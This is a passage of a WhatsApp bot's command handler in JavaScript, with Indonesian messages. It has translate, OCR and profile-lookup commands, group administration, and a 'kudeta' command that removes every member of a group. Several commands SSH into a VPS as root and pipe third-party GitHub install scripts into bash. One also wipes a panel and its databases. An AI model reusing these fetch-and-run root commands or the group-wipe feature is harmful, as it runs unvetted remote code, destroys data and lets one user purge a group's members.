if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await conn.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await conn.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ocr": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/tools/ocr?url=${dd}`)
await conn.sendMessage(m.chat, {text: resnya.result.toString()}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "removebg": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/imagecreator/removebg?url=${dd}`)
await conn.sendMessage(m.chat, {image: await getBuffer(resnya.result), caption: "Remove Background Done ✅"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokstalk": case "ttstalk": {
if (!text) return m.reply(example("username"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/tiktok?user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.nickname}
* *Username :* ${res.result.uniqueId}
* *Bio :* ${res?.result?.signature || ""}
* *Followers :* ${res.result.followerCount}
* *Following :* ${res.result.followingCount}
* *Private :* ${res.result.privateAccount == true ? "Ya" : "Tidak"}
`
await conn.sendMessage(m.chat, {image: {url: res.result.avatarMedium}, caption: teks}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "igstalk": {
if (!text) return m.reply(example("username"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/instagram?user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.name}
* *Username :* ${res.result.username}
* *Bio :* ${res.result.bio}
* *Total Postingan :* ${res.result.posts}
* *Followers :* ${res.result.followers}
* *Following :* ${res.result.following}
`
await conn.sendMessage(m.chat, {image: {url: res.result.avatar}, caption: teks}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytstalk": {
if (!text) return m.reply(example("username"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let res = await fetchJson(`https://restapi-v2.simplebot.my.id/stalk/youtube?user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
res = res.result.channelMetadata
const teks = `
* *Username :* ${res.username}
* *Subscriber :* ${res.subscriberCount}
* *Total Postingan :* ${res.videoCount}
* *Tautan :* ${res.channelUrl}
* *Deskripsi Channel :* ${res.description}
`
await conn.sendMessage(m.chat, {image: {url: res.avatarUrl}, caption: teks}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await conn.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await conn.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await conn.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await conn.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await conn.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await conn.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Tama Starting 🔥")
for (let i of memberFilter) {
await conn.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/

case "installtemadepend": {
if (!isOwner) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply("Penggunaan Salah!\n IpVps|PwVps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("Penggunaan Salah!\n IpVps|PwVps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isOwner) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install Depend silakan ketik .installnebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemanebula": {
if (!isOwner) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply("Penggunaan Salah!\n IpVps|PwVps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("Penggunaan Salah!\n IpVps|PwVps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isOwner) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemanight": case "installtemanightcore": {
if (!isOwner) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isOwner) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema nightcore* pterodactyl\nTunggu 1-10 menit hingga proses selesai, dan saya akan menghubungi anda kembali jika sudah selesai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nightcore* pterodactyl ✅\nSilahkan cek di panel anda untuk melihat perubahan")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`1\n`) 
stream.write(`y\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case "uninstalltemanight": case "uninstalltemanightcore": {
if (!isOwner) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isOwner) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses uninstall *tema nightcore* \nTunggu 1-3 menit hingga proses selesai, dan saya akan menghubungi anda kembali jika sudah selesai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil uninstall *tema nightcore* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`3\n`) 
stream.write(`y\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6282120066305\n');
stream.write('https://whatsapp.com/channel/0029VbAPhRL6xCSLpb1W7F2y\n');
stream.write('https://chat.whatsapp.com/GmKA8JEKoRF2Q9DHqB4cM2\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
